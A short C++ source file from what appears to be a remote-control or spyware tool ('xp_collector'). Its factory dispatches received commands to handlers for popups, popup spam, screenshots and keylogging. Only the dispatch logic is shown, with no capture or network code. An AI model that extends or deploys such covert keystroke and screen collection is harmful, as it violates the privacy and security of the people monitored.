#include "CommandHandlers/CommandHandlerFactory.h"
#include "CommandHandlers/PopupHandler.h"
#include "CommandHandlers/PopupSpamHandler.h"
#include "CommandHandlers/ScreenshotHandler.h"
#include "CommandHandlers/KeyLogHandler.h"

std::unique_ptr<xp_collector::ICommandHandler> xp_collector::CommandHandlerFactory::create(const BasicCommand& command, const std::string& command_id)
{
	switch (command.get_command_type())
	{
	case CommandType::Popup: return std::make_unique<PopupHandler>(command_id);
	case CommandType::PopupSpam: return std::make_unique<PopupSpamHandler>(command_id);
	case CommandType::Screenshot: return std::make_unique<ScreenshotHandler>(command_id);
	case CommandType::KeyLog: return std::make_unique<KeyLogHandler>(command_id);
	default: throw std::invalid_argument("Unhandled command type in CommandHandlerFactory");
	}
}
